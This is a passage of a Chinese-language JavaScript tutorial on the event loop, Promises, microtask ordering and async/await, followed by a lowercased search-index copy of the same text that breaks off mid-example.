1.并行操作\nPromise.all([func1(), func2(), func3()])\n.then(([result1, result2, result3]) => { });\n// 2.归并，从Promise.resolve()开始执行func1再执行func2再执行func3，最后到result3\n[func1, func2, func3].reduce((p, f) => p.then(f), Promise.resolve())\n.then(result3 => { /* use result3 */ });\n// 3.跟上面2是一样的，直接后面追加加，上面肯定要灵活一些\nPromise.resolve().then(func1).then(func2).then(func3);\n// 4.其实就是用函数封装了2\nconst composeAsync = (...funcs) => x => funcs.reduce(applyAsync, Promise.resolve(x));\n// 5.其实就是用函数封装了3\nconst applyAsync = (acc,val) => acc.then(val);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# resolve一个Promise对象\n\n你可能会遇到这样的问题：Promise.resolve(Promise.resolve(1))、Promise.resolve(new Promise(r => r(1)))、new Promise(r => r(Promise.resolve(1)))、new Promise(r => r(new Promise(nr => nr(1))))，这四个有什么区别？\n\nconsole.log(Promise.resolve(Promise.resolve(1)));\nconsole.log(Promise.resolve(new Promise(r => r(1))));\nconsole.log(new Promise(r => r(Promise.resolve(1))));\nconsole.log(new Promise(r => r(new Promise(nr => nr(1)))));\n\n\n1\n2\n3\n4\n\n\n在控制台里打印上面的代码，会有如下结果：\n\n\n\n其实就是问Promise.resolve(v)和new Promise(r => r(v))的区别。\n\n * Promise.resolve(v)：如果v是普通值，会将这个普通值包装成已经fulfilled的Promise实例；如果v本就是一个Promise实例，那就会原封不动返回v。\n * new Promise(r => r(v))：如果v是普通值，那整体会是一个已经fulfilled的Promise实例；但是如果v本就是一个Promise实例，那底层会调用ResolvePromise(promise, resolution)去处理，其中入参promise是new Promise(r => r(xxx))本身，入参resolution是v。具体的：\n   * 处理时会创建PromiseResolveThenableJob，创建的PromiseResolveThenableJob会作为一个microtask；\n   * 然后会运行PromiseResolveThenableJob让v的then里的回调函数进入microtask队列，也就是占了一个microtask；\n   * 运行完后，new Promise(r => r(xxx))本身状态会变为fulfilled，那么总的来说new Promise(r => r(v)整体变为fulfilled会占用两个microtask时序。\n\n另外一个知识点，then()对外暴露应该是一个Promise对象，如果在then内部return v;，这个return v;要分两种情况，其实和上面的new Promise(r => r(v))是一样的。\n\n * 如果return v;语句的值是一个是普通值，那then对外暴露的Promise对象其实就是将这个普通值v包装成已经fulfilled的Promise对象。\n * 如果return v;语句的值本就是一个Promise对象，那么底层会调用ResolvePromise(promise, resolution)处理，入参promise就是then对外暴露的Promise对象，resolution就是v这个Promise对象。会经过PromiseResolveThenableJob的创建和运行（占用两个microtask时序），最后让then对外暴露的Promise对象的状态变为fulfilled。\n\n为什么不直接让v赋给目标Promise对象，这样就太简单粗暴了，v的状态是pending还是fulfilled是不确定（即使是fulfilled，但它的then回调函数还没执行）。得使用PromiseResolveThenableJob来确定v的状态并执行它的then回调函数，这些走完后才能让目标Promise也fulfilled。\n\n// begin 1 then 2 3 4\nconst p = new Promise(resolve => {\n    console.log("begin");\n    resolve("then");\n});\n// 原封不动返回p，所以相当于p.then(v => console.log(v))，那么"then"会比2先打印\nPromise.resolve(p)\n.then(v => console.log(v));\n\nnew Promise(resolve => {\n    console.log(1);\n    resolve();\n})\n.then(() => console.log(2))\n.then(() => console.log(3))\n.then(() => console.log(4));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n// begin 1 2 3 then 4\nconst p = new Promise(resolve => {\n    console.log("begin");\n    resolve("then");\n});\n// resolve(p)，创建PromiseResolveThenableJob会占用一个microtask\n// 运行PromiseResolveThenableJob，让p的then回调函数执行，这也会占用一个microtask\nnew Promise(resolve => {\n    resolve(p);\n})\n.then(v => console.log(v)); // 经过两个时序（打印了2和3）才打印了"then"\n\nnew Promise(resolve => {\n    console.log(1);\n    resolve();\n})\n.then(() => console.log(2))\n.then(() => console.log(3))\n.then(() => console.log(4));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n// begin 1 test 2 3 4 then\nconst p = new Promise(resolve => {\n    console.log("begin");\n    resolve("then");\n});\n// Promise.resolve(p).then相当于p.then，那么"test"会先于2，这个同第一个例子\n// 第一个then里是return Promise.resolve(v)，这会触发ResolvePromise(promise, resolution)，\n// promise入参是代表第一个then的promise，resolution入参是v。跟上一个例子一样要占用两个micrtask时序\nPromise.resolve(p)\n.then(v => {\n    console.log("test");\n    return Promise.resolve(v) // 其实如果是return v;那就不会触发ResolvePromise了\n})\n.then(v => console.log(v)); // 但是比上一例子多了一个then，那么"then"会在4后面打印了\n\nnew Promise(resolve => {\n    console.log(1);\n    resolve();\n})\n.then(() => console.log(2))\n.then(() => console.log(3))\n.then(() => console.log(4));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n参考资料：\n\n * 关于ResolvePromise\n * 至于PromiseResolveThenableJob为什么会消耗两个micrtask可以看resolve(resolvedPromise)情况源码这篇文章。\n\n\n# async和await\n\n\n# 简单使用async和await\n\nasync和await的搭配使用，可以写出更简洁的基于Promise的异步行为。async用来修饰函数表示函数中即将使用await表达式，async函数一定会返回一个promise对象（就算没有也会被Promise.resolve转换）；await用于暂停整个async函数的执行进程并出让其控制权，只有当其等待的基于promise的异步操作被兑现或被拒绝之后才会恢复进程；其实await可以用于普通函数，也就是await等到的是一个普通值，它就是不会让出控制权（不阻塞后面的代码）。基本语法：\n\nasync function name([param[, param[, ... param]]]) {\n    statements // 0个或者多个await表达式\n}\n\n\n1\n2\n3\n\n\n我们来使用async和await重写之前Promise的例子\n\n// 使用Promise，链式\ndoA().then((rlt) => {\n    return doB(rlt); // 返回doB的Promise对象，好让后面继续使用链式结构\n}).then((newRlt) => {\n    return doC(newRlt);\n}).then((finRlt) => {\n    console.log(\'FinalResult:\', finRlt);\n}).catch(failFun);\n\n// 使用async和await\nasync function doSomething() {\n    try {\n        const rlt = await doA();\n        const newRlt = await doB(rlt);\n        const finRlt = await doC(newRlt);\n        console.log(\'FinalResult:\', finRlt);\n    } catch(failFun) { }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n改写精准的错误捕获例子\n\n// 使用Promise，链式\ndoA()\n.then(rlt => doB(rlt).then(optRlt => doC(optRlt)).catch(e => {console.log(e.message)}))\n.then(newRlt => doD(newRlt))\n.then(finRlt => { console.log(\'FinalResult:\', finRlt) })\n.catch(failFun);\n\n// 使用async和await\nasync function doSomething() {\n    try {\n        const rlt = await doA();\n        let optRlt = null;\n        let newRlt = null;\n        try {\n            optRlt = await doB(rlt);\n            newRlt = await doC(optRlt);\n        } catch(e) {\n            console.log(e.message)\n        }\n        const finRlt = await doD(newRlt);\n        console.log(\'FinalResult:\', finRlt);\n    } catch(failFun) { }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# async和await相关执行顺序\n\n我们先看一下EventLoop、Promise、async/await等结合起来的题目：\n\n// 输出依次为5 1 6 2 3 7 4\nfunction testSometing() {\n    console.log("1");\n    return "2";\n}\nasync function testAsync() {\n    console.log("3");\n    return Promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // await "2"，会转换为await Promise.resolve("2")，状态是`fulfilled`\n    const v1 = await testSometing();\n    console.log(v1);\n    const v2 = await testAsync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new Promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n// 输出依次为5 1 6 2 3 7 4\nfunction testSometing() {\n    console.log("1");\n    return Promise.resolve("2");\n}\nasync function testAsync() {\n    console.log("3");\n    return Promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // await Promise.resolve("2")，状态是`fulfilled`\n    const v1 = await testSometing();\n    console.log(v1);\n    const v2 = await testAsync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new Promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n// 输出依次为5 1 6 2 3 7 4\nasync function testSometing() {\n    console.log("1");\n    return "2";\n}\nasync function testAsync() {\n    console.log("3");\n    return Promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // await Promise.resolve("2")，状态是`fulfilled`\n    const v1 = await testSometing();\n    console.log(v1);\n    const v2 = await testAsync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new Promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n// 输出依次为5 1 6 7 2 3 4\nasync function testSometing() {\n    console.log("1");\n    return Promise.resolve("2");\n}\nasync function testAsync() {\n    console.log("3");\n    return Promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // testSometing()里用了async标识，并且返回是`return Promise.resolve("2")`\n    // 这会导致要经过ResolvePromise(promise, resolution)的处理，入参promise是\n    // testSometing()对外暴露的Promise对象，入参resolution是Promise.resolve("2")\n    // 处理完后`await testSometing()`这里才`fulfilled`，那么`7`会先于`2`打印\n    const v1 = await testSometing();\n    console.log(v1);\n    const v2 = await testAsync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new Promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n要解释上面这些例子必须先弄懂不带async/await的异步执行顺序问题，也就是resolve一个Promise对象的内容。\n\n然后还要知道async函数的对外暴露的得是一个Promise对象，如果在sync函数内部return v;，它的处理和then()一样：\n\n * 如果return v;语句的值是一个是普通值，那async函数的对外暴露的Promise对象其实就是将这个普通值v包装成已经fulfilled的Promise对象。\n * 如果return v;语句的值本就是一个Promise对象，那么底层会调用ResolvePromise(promise, resolution)处理，入参promise就是async函数的对外暴露的Promise对象，入参resolution就是v这个Promise对象。会经过PromiseResolveThenableJob的创建和运行（占用两个microtask时序），最后让async函数的对外暴露的Promise对象的状态变为fulfilled。\n\n最后还要知道await等到的值是普通值是会被Promise.resolve()进行隐式转换（转换后是fulfilled的）。',normalizedContent:'# 异步编程\n\n\n# eventloop\n\n> 参考资料1：8 web application apis\n> 参考资料2：跟着whatwg看一遍事件循环\n> 参考资料3：html系列：macrotask和microtask\n\njs引擎是单线程运行的，同一时刻只能执行一个代码块。比如请求接口时，如果js引擎停下来等服务端传来响应，那就会阻塞其他代码运行。所以js引擎处理接口是异步的，会将接口响应任务存消息队列里然后就执行其他代码了，等后面执行栈空闲了再来处理响应任务。类似的还有定时器、侦听器等，它们可以说是异步请求同步执行，意思是请求我发给你了，但我得处理其他主要事情（异步请求）；就算你响应立马给我了，我也只是暂时排在任务列表里，手头里主要事情做完了才会去处理响应（同步处理）。\n\njs引擎对这些异步操作就是使用eventloop事件循环来调配处理的，所用的消息队列分为task队列和microtask队列。eventloop的一个处理回合：首先会先执行task队列中的一个任务，然后再执行microtask队列里的所有任务，最后再根据需要与否去渲染页面。在这个回合中是同步执行的，不会出现既要处理这个任务也要处理那个任务。\n\neventloop中task队列可能有多个，原因是其中一个task队列负责优先级比较高的任务（鼠标键盘事件等），另一个task队列负责普通的任务（定时器等）；还有task队列是set而不是queue，eventloop会从中取最早并且可执行的任务出来并推入执行栈中执行。比较常见的task：settimeout、setinterval、setimmediate、requestanimationframe、i/o，还有类似click、ajax还有<script>标签里的代码。\n\neventloop中microtask队列一般只有一个，并且是queue，找元素用的是出队列的方式。比较常见的microtask：promise、object.observe、mutationobserver。\n\n<html>\n<head>\n    <script>\n        (function test() {\n            settimeout(() => {\n                console.log(1)\n            }, 0);\n            new promise((resolve) => {\n                console.log(2);\n                for (var i = 0; i < 10000; i++) {\n                    i == 9999 && resolve(3);\n                }\n                console.log(4);\n            }).then((data) => {\n                console.log(data);\n            });\n            console.log(5);\n        })()\n    <\/script>\n    <script>\n        (function test2() {\n            settimeout(() => {\n                console.log(6)\n            }, 0);\n            new promise((resolve) => {\n                console.log(7);\n                for (var i = 0; i < 10000; i++) {\n                    i == 9999 && resolve(8);\n                }\n                console.log(9);\n            }).then((data) => {\n                console.log(data);\n            });\n            console.log(10);\n        })();\n    <\/script>\n</head>\n<body></body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n上面这段程序在谷歌浏览器中执行的，其打印顺序就是：2 4 5 3 7 9 10 8 1 6。\n\n * 首先两个<script>标签里代码的运行是两个task，先添加进task队列里；\n * 从task队列里取可执行的task，也就是第一个<script>标签开始执行；\n * 遇到settimeout，将它放入task队列里；\n * 因为promise内部是同步的，所以先打印2和4，在resolve()后会把promise的then回调函数放入microtask队列里；\n * 遇到console.log(5)，打印完5才表示一个task执行完了，现在得去执行microtask队列所有任务；\n   * microtask队列目前就一个then回调函数，那么打印3，结束microtask队列，进入新的task。\n * 从task队列里取可执行的task，也就是第二个<script>标签开始执行；\n * 遇到settimeout，将它放入task队列里；\n * 因为promise内部是同步的，所以先打印7和9，在resolve()后会把promise的then回调函数放入microtask队列里；\n * 遇到console.log(10)，打印完10才表示一个task执行完了，现在得去执行microtask队列所有任务；\n   * microtask队列目前就一个then回调函数，那么打印8，结束microtask队列，进入新的task。\n * 从task队列里取可执行的task，也就第一个settimeout，打印1；\n * 从task队列里取可执行的task，也就第二个settimeout，打印6；\n * 结束了，以上省略了ui渲染，因为没有涉及到页面的操作。\n\n上面这些都是说浏览器的eventloop，其实node环境中还是不一样的，node.js有用到process.nexttick，它并不是eventloop中的一部分，它是优先于microtask执行的；还有一个setimmediate，是个定时器，在i/o操作中先于任何其他定时器的，但非i/o操作里setimmediate的先后就不一定了，比较受线程性能的影响（比如设置毫秒数是0到几十的时候，settimeout一般优于setimmediate）。有兴趣可以查看node.js 事件循环。\n\n(() => {\n    setimmediate(() => {\n        console.log(1);\n    }, 0);\n    settimeout(() => {\n        console.log(2);\n    }, 0);\n    function a() {\n        setimmediate(() => {\n            console.log(3);\n        }, 0);\n        settimeout(() => {\n            console.log(4);\n        }, 0);\n        new promise((resolve) => {\n            console.log(5);\n            resolve(6);\n            console.log(7);\n        }).then((data) => {\n            console.log(data);\n        });\n        console.log(8);\n        process.nexttick(() => {\n            console.log(9);\n        });\n        console.log(10);\n    }\n    new promise((resolve) => {\n        console.log(11);\n        resolve(12);\n        console.log(13);\n    }).then((data) => {\n        console.log(data);\n    });\n    a();\n    console.log(14);\n    process.nexttick(() => {\n        console.log(15);\n    });\n    console.log(16);\n})();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n上面这段程序在node中执行的，其打印顺序就是：11 13 5 7 8 10 14 16 9 15 12 6 2 4 1 3。具体不展开了，有时间再来扩展node中eventloop。\n\n\n# promise\n\n上一节后，我们对异步操作的背后有了比较清晰的认知，但这都是浏览器内部的处理，我们书写互相依赖的异步操作的时候，就非常容易形成“回调地狱”，所以后面es6提出了使用promise来解决这种问题。\n\n\n# 什么是promise\n\npromise内存储着一个异步操作，这个异步操作要等到未来才会有结果。promise存储的异步操作有三种状态：pending（进行中）、fulfilled（已兑现）和rejected（已拒绝），这三种状态就是异步操作的结果赋予的，其他人改变不了。\n\n还有一个经常跟promise一起使用的术语：resolved（已决议）。它表示异步操作敲定好了状态，该状态可能是fulfilled也可能是rejected。\n\n\n# 调用处使用promise\n\n未推出promise时，一般做法就是回调函数会作为异步函数的入参，异步函数里的异步操作结束后会根据结果来执行对应的入参（执行回调函数）。推出promise后，不会将回调函数传给异步函数，而是异步函数会返回promise对象，异步操作结束后会根据结果来调用promise对象的then中对应的回调函数。\n\n// 以前的调用：将sucfun和failfun以参数的形式传给异步函数doa，根据需要会执行sucfun和failfun\ndoa(data, sucfun, failfun);\n// 使用promise：异步函数doa会返回一个promise对象，根据需要会执行promise对象的then方法里的sucfun和failfun\ndoa(data).then(sucfun, failfun);\n\n\n1\n2\n3\n4\n\n\n.then(onfulfilled[, onrejected])中第一个参数是成功回调函数，第二个参数是失败回调函数（可选参数），并且then会返回了一个promise对象，那就可以继续使用then，这样就会形成一种链式调用。以前接口互相依赖时采用嵌套写法，写起来非常占位置也不美观，现在使用promise会非常清爽。\n\n// 以前，函数嵌套\ndoa(data, (rlt) => {\n  dob(rlt, (newrlt) => {\n    doc(newrlt, (finrlt) => {\n      console.log(\'finalresult:\', finrlt);\n    }, failfun);\n  }, failfun);\n}, failfun);\n\n// 使用promise，链式\ndoa().then((rlt) => {\n    return dob(rlt); // 返回dob的promise对象，好让后面继续使用链式结构\n}).then((newrlt) => {\n    return doc(newrlt);\n}).then((finrlt) => {\n    console.log(\'finalresult:\', finrlt);\n}).catch(failfun);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n注意：onfulfilled或onrejected执行完后，then是返回的一个新promise。也就是说你在onfulfilled或onrejected里自己返回一个值或者error时，也是返回一个promise，可以继续在后面写then这种链式调用。\n\n\n# promise对象内部\n\n上一节是说怎么使用promise的方式调用异步函数，并且展示了多个异步函数时使用promise方式的优势。这一节说的是异步函数内部会返回一个promise对象，这个过程会是一个什么样子呢？\n\n首先在异步函数里创建一个promise对象，new promise((resolve, reject) => {})；promise构造函数会传递一个参数，这个参数是一个executor处理器函数，是专门用于处理具体的异步操作的；操作完异步操作当然还要通知调用方，executor函数的两个入参resolve和reject就是专门做这些事的；当异步任务顺利完成且返回结果值时，会执行resolve方法，将promise对象的状态置为fulfilled；而当异步任务失败且返回失败原因，会执行resolve方法，将promise对象的状态置为rejected。\n\nfunction doa(data) {\n    // promise对象内部（当前小节的内容）\n    return new promise((resolve, reject) => { // 这个匿名函数其实是executor函数\n        /* 某某异步操作 */\n        if (/* 操作成功 */)\n            resolve(result); // 通知操作成功，data是异步操作的结果\n        else\n            reject(error); // 通知操作失败，error是一个异常对象\n    });\n}\n// 调用处使用promise（上一小节的内容）\ndoa(data).then((result) => { // 接收resolve通知\n    console.log(result);\n}, (error) => { // 接收reject通知\n    console.log(error);\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n一个使用promise封装ajax的例子：\n\nfunction get(url) {\n    return new promise((resolve, reject) => {\n        $.ajax({\n            url: url,\n            method: \'get\' ,\n            success: (data) => {\n                resolve(data);\n            },\n            error: (xhr, statustext) => {\n                reject(statustext);\n            }\n        });\n    });\n}\nget(\'xxx\').then((result) => {\n    return result;\n}, (error) => {\n    return error;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 关于错误处理\n\n错误处理：遇到异常抛出时，会顺着promise链寻找下一个onrejected失败回调函数（then中的onrejected），如果没有一个onrejected，就会去.catch()里指定的函数里执行。可以看调用处使用promise的第二个例子，其中有三次failfun，但最后只用.catch()来处理。\n\n可以对错误进行精准的捕获，只是需要嵌套promise。下面这个例子中内部嵌套了一个promise，并且还带了一个catch，这个catch能精准捕获到dob和doc的失败，而doa只会被最外层的catch会捕获。\n\n// 使用promise，链式\ndoa()\n.then(\n    rlt => dob(rlt).then(optrlt => doc(optrlt)).catch(e => {console.log(e.message)})\n)\n.then(newrlt => dod(newrlt))\n.then(finrlt => { console.log(\'finalresult:\', finrlt) })\n.catch(failfun);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 时序和拒绝事件\n\n已经变成resolve状态的promise对象，会通知then()里对应的函数，这个通知传递的过程是异步的。也就是说传递到then()中的回调函数是会被放到一个microtask队列里的，不过promise对象里其他的执行还是同步，这就能印证eventloop里第一个例子中2和4为什么先于3打印。\n\n拒绝事件：当promise被拒绝时，如果有reject函数处理了，就会派发rejectionhandled事件到全局作用域；如果没有经过reject函数处理，则会派发unhandledrejection事件到全局作用域。两个事件都有promise属性和reason属性，其中promise属性是指向被驳回的promise，reason属性是说明被驳回的原因。\n\nwindow.addeventlistener("unhandledrejection", event => {\n  /* 你可以在这里添加一些代码，以便检查\n     event.promise 中的 promise 和\n     event.reason 中的 rejection 原因 */\n  event.preventdefault();\n}, false);\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# promise组合工具\n\npromise.resolve(value)：手动创建一个已经resolve的promise对象，相当于new promise(resolve => resolve(value))（但不完全是，因为下一节会讲new promise(r => r(v))中v是个promise对象的情况）。\n\npromise.reject(value)：手动创建一个已经reject的promise对象，相当于new promise((resolve, reject) => reject(value))。\n\nvar p = promise.all([p1, p2, p3])：all接受一个promise对象数组（也可以是iterator并且返回promise对象），当数组里所有的promise对象状态为fulfilled时，p这个promise对象状态才为fulfilled，并且结果也会组成数组传递给p的回调函数；当数组里只要一个被rejected了，那么p就是rejected状态，其结果会传递给p的回调函数。\n\nvar p = promise.race([p1, p2, p3])：race接受一个promise对象数组（也可以是iterator并且返回promise对象），当数组里只要一个被确定状态了，那么p就是随之确定状态了，其结果会传递给p的回调函数。\n\n// 1.并行操作\npromise.all([func1(), func2(), func3()])\n.then(([result1, result2, result3]) => { });\n// 2.归并，从promise.resolve()开始执行func1再执行func2再执行func3，最后到result3\n[func1, func2, func3].reduce((p, f) => p.then(f), promise.resolve())\n.then(result3 => { /* use result3 */ });\n// 3.跟上面2是一样的，直接后面追加加，上面肯定要灵活一些\npromise.resolve().then(func1).then(func2).then(func3);\n// 4.其实就是用函数封装了2\nconst composeasync = (...funcs) => x => funcs.reduce(applyasync, promise.resolve(x));\n// 5.其实就是用函数封装了3\nconst applyasync = (acc,val) => acc.then(val);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# resolve一个promise对象\n\n你可能会遇到这样的问题：promise.resolve(promise.resolve(1))、promise.resolve(new promise(r => r(1)))、new promise(r => r(promise.resolve(1)))、new promise(r => r(new promise(nr => nr(1))))，这四个有什么区别？\n\nconsole.log(promise.resolve(promise.resolve(1)));\nconsole.log(promise.resolve(new promise(r => r(1))));\nconsole.log(new promise(r => r(promise.resolve(1))));\nconsole.log(new promise(r => r(new promise(nr => nr(1)))));\n\n\n1\n2\n3\n4\n\n\n在控制台里打印上面的代码，会有如下结果：\n\n\n\n其实就是问promise.resolve(v)和new promise(r => r(v))的区别。\n\n * promise.resolve(v)：如果v是普通值，会将这个普通值包装成已经fulfilled的promise实例；如果v本就是一个promise实例，那就会原封不动返回v。\n * new promise(r => r(v))：如果v是普通值，那整体会是一个已经fulfilled的promise实例；但是如果v本就是一个promise实例，那底层会调用resolvepromise(promise, resolution)去处理，其中入参promise是new promise(r => r(xxx))本身，入参resolution是v。具体的：\n   * 处理时会创建promiseresolvethenablejob，创建的promiseresolvethenablejob会作为一个microtask；\n   * 然后会运行promiseresolvethenablejob让v的then里的回调函数进入microtask队列，也就是占了一个microtask；\n   * 运行完后，new promise(r => r(xxx))本身状态会变为fulfilled，那么总的来说new promise(r => r(v)整体变为fulfilled会占用两个microtask时序。\n\n另外一个知识点，then()对外暴露应该是一个promise对象，如果在then内部return v;，这个return v;要分两种情况，其实和上面的new promise(r => r(v))是一样的。\n\n * 如果return v;语句的值是一个是普通值，那then对外暴露的promise对象其实就是将这个普通值v包装成已经fulfilled的promise对象。\n * 如果return v;语句的值本就是一个promise对象，那么底层会调用resolvepromise(promise, resolution)处理，入参promise就是then对外暴露的promise对象，resolution就是v这个promise对象。会经过promiseresolvethenablejob的创建和运行（占用两个microtask时序），最后让then对外暴露的promise对象的状态变为fulfilled。\n\n为什么不直接让v赋给目标promise对象，这样就太简单粗暴了，v的状态是pending还是fulfilled是不确定（即使是fulfilled，但它的then回调函数还没执行）。得使用promiseresolvethenablejob来确定v的状态并执行它的then回调函数，这些走完后才能让目标promise也fulfilled。\n\n// begin 1 then 2 3 4\nconst p = new promise(resolve => {\n    console.log("begin");\n    resolve("then");\n});\n// 原封不动返回p，所以相当于p.then(v => console.log(v))，那么"then"会比2先打印\npromise.resolve(p)\n.then(v => console.log(v));\n\nnew promise(resolve => {\n    console.log(1);\n    resolve();\n})\n.then(() => console.log(2))\n.then(() => console.log(3))\n.then(() => console.log(4));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n// begin 1 2 3 then 4\nconst p = new promise(resolve => {\n    console.log("begin");\n    resolve("then");\n});\n// resolve(p)，创建promiseresolvethenablejob会占用一个microtask\n// 运行promiseresolvethenablejob，让p的then回调函数执行，这也会占用一个microtask\nnew promise(resolve => {\n    resolve(p);\n})\n.then(v => console.log(v)); // 经过两个时序（打印了2和3）才打印了"then"\n\nnew promise(resolve => {\n    console.log(1);\n    resolve();\n})\n.then(() => console.log(2))\n.then(() => console.log(3))\n.then(() => console.log(4));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n// begin 1 test 2 3 4 then\nconst p = new promise(resolve => {\n    console.log("begin");\n    resolve("then");\n});\n// promise.resolve(p).then相当于p.then，那么"test"会先于2，这个同第一个例子\n// 第一个then里是return promise.resolve(v)，这会触发resolvepromise(promise, resolution)，\n// promise入参是代表第一个then的promise，resolution入参是v。跟上一个例子一样要占用两个micrtask时序\npromise.resolve(p)\n.then(v => {\n    console.log("test");\n    return promise.resolve(v) // 其实如果是return v;那就不会触发resolvepromise了\n})\n.then(v => console.log(v)); // 但是比上一例子多了一个then，那么"then"会在4后面打印了\n\nnew promise(resolve => {\n    console.log(1);\n    resolve();\n})\n.then(() => console.log(2))\n.then(() => console.log(3))\n.then(() => console.log(4));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n参考资料：\n\n * 关于resolvepromise\n * 至于promiseresolvethenablejob为什么会消耗两个micrtask可以看resolve(resolvedpromise)情况源码这篇文章。\n\n\n# async和await\n\n\n# 简单使用async和await\n\nasync和await的搭配使用，可以写出更简洁的基于promise的异步行为。async用来修饰函数表示函数中即将使用await表达式，async函数一定会返回一个promise对象（就算没有也会被promise.resolve转换）；await用于暂停整个async函数的执行进程并出让其控制权，只有当其等待的基于promise的异步操作被兑现或被拒绝之后才会恢复进程；其实await可以用于普通函数，也就是await等到的是一个普通值，它就是不会让出控制权（不阻塞后面的代码）。基本语法：\n\nasync function name([param[, param[, ... param]]]) {\n    statements // 0个或者多个await表达式\n}\n\n\n1\n2\n3\n\n\n我们来使用async和await重写之前promise的例子\n\n// 使用promise，链式\ndoa().then((rlt) => {\n    return dob(rlt); // 返回dob的promise对象，好让后面继续使用链式结构\n}).then((newrlt) => {\n    return doc(newrlt);\n}).then((finrlt) => {\n    console.log(\'finalresult:\', finrlt);\n}).catch(failfun);\n\n// 使用async和await\nasync function dosomething() {\n    try {\n        const rlt = await doa();\n        const newrlt = await dob(rlt);\n        const finrlt = await doc(newrlt);\n        console.log(\'finalresult:\', finrlt);\n    } catch(failfun) { }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n改写精准的错误捕获例子\n\n// 使用promise，链式\ndoa()\n.then(rlt => dob(rlt).then(optrlt => doc(optrlt)).catch(e => {console.log(e.message)}))\n.then(newrlt => dod(newrlt))\n.then(finrlt => { console.log(\'finalresult:\', finrlt) })\n.catch(failfun);\n\n// 使用async和await\nasync function dosomething() {\n    try {\n        const rlt = await doa();\n        let optrlt = null;\n        let newrlt = null;\n        try {\n            optrlt = await dob(rlt);\n            newrlt = await doc(optrlt);\n        } catch(e) {\n            console.log(e.message)\n        }\n        const finrlt = await dod(newrlt);\n        console.log(\'finalresult:\', finrlt);\n    } catch(failfun) { }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# async和await相关执行顺序\n\n我们先看一下eventloop、promise、async/await等结合起来的题目：\n\n// 输出依次为5 1 6 2 3 7 4\nfunction testsometing() {\n    console.log("1");\n    return "2";\n}\nasync function testasync() {\n    console.log("3");\n    return promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // await "2"，会转换为await promise.resolve("2")，状态是`fulfilled`\n    const v1 = await testsometing();\n    console.log(v1);\n    const v2 = await testasync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n// 输出依次为5 1 6 2 3 7 4\nfunction testsometing() {\n    console.log("1");\n    return 